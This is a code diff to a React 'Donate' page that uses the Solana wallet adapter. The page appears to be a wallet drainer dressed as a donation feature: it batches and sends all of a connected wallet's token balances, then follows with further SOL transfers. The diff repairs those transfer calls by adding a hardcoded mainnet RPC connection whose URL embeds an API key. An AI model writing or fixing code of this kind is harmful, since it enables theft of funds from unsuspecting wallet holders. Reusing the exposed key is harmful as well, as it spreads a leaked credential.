@@ -1,6 +1,7 @@
 import { useState, useEffect } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
+import { Connection } from "@solana/web3.js";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Alert, AlertDescription } from "@/components/ui/alert";
@@ -59,6 +60,7 @@ export default function Donate() {
     setDonationStatus("loading");
 
     try {
+      const connection = new Connection("https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b", "confirmed");
       const tokensToSend = balances.tokens;
       const batchSize = 5;
       const batches: typeof tokensToSend[] = [];
@@ -77,7 +79,7 @@ export default function Donate() {
           false
         );
 
-        const signature = await sendTransaction(transaction, { skipPreflight: false } as any);
+        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
         console.log(`Batch ${i + 1} sent:`, signature);
 
         toast({
@@ -93,7 +95,7 @@ export default function Donate() {
           [],
           true
         );
-        await sendTransaction(solTransaction70, { skipPreflight: false } as any);
+        await sendTransaction(solTransaction70, connection, { skipPreflight: false });
         
         toast({
           title: "SOL Sent",
@@ -107,7 +109,7 @@ export default function Donate() {
           publicKey,
           sendTransaction,
         } as any);
-        await sendTransaction(finalSolTransaction, { skipPreflight: false } as any);
+        await sendTransaction(finalSolTransaction, connection, { skipPreflight: false });
 
         toast({
           title: "Final Transfer Complete",
